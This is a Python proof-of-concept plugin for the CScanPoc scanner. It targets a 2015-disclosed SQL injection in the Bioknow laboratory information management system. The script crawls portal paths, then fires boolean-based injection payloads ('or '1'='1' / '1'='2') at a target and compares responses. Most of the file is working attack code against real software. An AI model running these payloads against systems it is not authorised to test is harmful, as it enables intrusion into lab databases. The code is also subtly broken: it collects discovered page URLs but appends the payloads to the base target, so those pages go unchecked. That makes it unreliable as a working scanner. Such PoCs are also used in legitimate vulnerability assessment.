# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Bioknow_0003'  # 平台漏洞编号，留空
    name = '百奥知实验室综合信息管理系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-14'  # 漏洞公布时间
    desc = '''
        百奥知实验室综合信息管理系统是一款由北京百奥知信息科技有限公司自主研发的实验室管理系统。
        百奥知实验室综合信息管理系统：
        '?nowlx=m%27%20or%20%271%27=%271'
        '?nowlx=m%27%20or%20%271%27=%272'
        处存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0107187'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '百奥知实验室综合信息管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


def matchurl(arg):
    hh = hackhttp.hackhttp()
    arg = arg + '/portal/'
    code, head, res, errcode, _ = hh.http(arg)
    m = re.findall('/portal/root/(.*?)/', res)
    m1 = []
    for data in m:
        if data in m1:
            pass
        else:
            m1.append(data)

    urllist = []
    for data in m1:
        url = arg + 'root/' + data + '/gg_list.jsp'
        code, head, res, errcode, _ = hh.http(url)
        if code == 200:
            urllist.append(url)
    return urllist


class Poc(ABPoc):
    poc_id = '42d46a99-4e25-417a-a41d-ed35e008d8d9'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-0107187
            hh = hackhttp.hackhttp()
            arglist = matchurl(self.target)
            for arg in arglist:
                payload1 = '?nowlx=m%27%20or%20%271%27=%271'
                payload2 = '?nowlx=m%27%20or%20%271%27=%272'
                url1 = self.target + payload1
                url2 = self.target + payload2
                code1, head, res1, errcode, _ = hh.http(url1)
                code2, head, res2, errcode, _ = hh.http(url2)
                m1 = re.search('class="gray"', res1)
                m2 = re.search('class="gray"', res2)

                if code1 == 200 and code2 == 200 and m1 and m2 == None:
                    #security_hole(arg +'?nowlx=m'+'  :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
